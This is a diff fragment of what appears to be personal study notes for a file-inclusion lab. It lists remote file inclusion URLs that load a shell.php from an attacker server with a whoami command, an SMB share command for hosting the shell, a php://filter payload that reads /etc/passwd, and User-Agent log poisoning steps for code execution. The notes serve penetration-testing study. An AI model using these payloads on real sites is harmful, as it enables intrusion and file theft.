@@ -65,6 +65,7 @@ call the file with url http://website.com/index.php?language=http://yourserverip
 * Windows RFI 
  can be called via the below command and url as follows http://blog.inlanefreight.com/index.php?language=\\serverIp\share\shell.php&cmd=whoami
 > smbserver.py -smb2support share $(pwd)
+
 * Source Code Disclosure via PHP Wrappers
 Can be done via the following code 
 > php://filter/read=convert.base64-encode/resource=/etc/passwd
@@ -74,6 +75,7 @@ Then execute the URL in linux console proceeded by cURL to get the code.
 Decrypt the code via command 
 > echo 'insert-code-here' | base64 -d
 /ilf_admin/index.php?
+
 * RCE through Log Files
 Files will be at /var/log/apache2/access.log, /var/log/nginx/access.log, /var/log/sshd.log, /var/log/mail, and /var/log/vsftpd.log
 Start Burp Suite, intercept a request to the page, and send it to Repeater. Next, change the User-Agent header to something else such as Apache Log Poisoning and click Go
